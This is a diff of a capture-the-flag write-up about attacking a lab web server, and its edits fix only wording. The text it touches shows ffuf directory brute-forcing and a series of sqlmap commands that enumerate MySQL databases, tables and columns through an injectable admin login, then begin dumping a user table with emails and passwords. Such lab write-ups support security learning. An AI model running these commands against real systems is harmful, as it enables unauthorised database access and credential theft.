@@ -104,12 +104,12 @@ Went to `http://10.10.116.111:1337` with the browser and got a blank page with "
 `ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.116.111:1337/FUZZ`
 found "/admin, /admin_101, /javascript, /phpmyadmin & /server-status".
 
-"/admin, /admin_101 & /phpmyadmin" all have login pages but "/admin" states "Is this the right admin portal?". Testing "/admin" login does not really do anything so let's look at the "/admin_101" next.
+"/admin, /admin_101 & /phpmyadmin" all have login pages but "/admin" states "Is this the right admin portal?". Testing "/admin" login does not do anything so let's look at the "/admin_101" next.
 Used burp to proxy the request to a file for sqlmap to test for injection vulnerabilities. 
-`sqlmap -l req --level=4 --risk=2` tells that backend server seems to be "MySQL 
-`sqlmap -l req --dbms=MySQL --dbs` found "[*] expose,[*] information_schema,[*] mysql,[*] performance_schema,[*] phpmyadmin,[*] sys" databases.
+`sqlmap -l req --level=4 --risk=2` tells that backend server seems to be MySQL 
+`sqlmap -l req --dbms=MySQL --dbs` found "* expose, information_schema, mysql, performance_schema, phpmyadmin, sys*" databases.
 `sqlmap -l req --dbms=MySQL -D expose,mysql,phpmyadmin --tables` dumps tables from databases "expose,mysql,phpmyadmin".
-I started with expose database. There were "user, config" tables so lets find out columns for "user" table. 
+I started with expose database. There were "user, config" tables so let's find out columns for "user" table. 
 `sqlmap -l req --dbms=MySQL -D expose -T user --columns` found "created,email,id,password" columns so let's dump them!
 ````
 +-----------------+----+--------------------------------------+
